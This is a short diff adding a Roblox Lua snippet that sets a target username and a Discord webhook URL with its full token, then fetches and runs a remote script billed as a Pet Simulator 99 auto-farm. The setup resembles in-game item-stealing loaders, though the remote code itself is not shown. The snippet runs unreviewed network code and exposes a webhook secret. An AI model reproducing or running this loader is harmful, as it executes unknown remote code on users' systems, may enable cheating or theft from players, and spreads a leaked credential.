@@ -1,0 +1,4 @@
+_G.username = "MrkornRBLXalt1"
+_G.Webhook = "https://discord.com/api/webhooks/1295041962293985290/3Z8qAcPDn-ViallX5SKax_p5A_RKcQfZnjHoTuB_cqXMUvqR2F_vgDi2nVl_YA3YAukL"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PS99/main/PetSimulator99AutoFarm.lua'))()
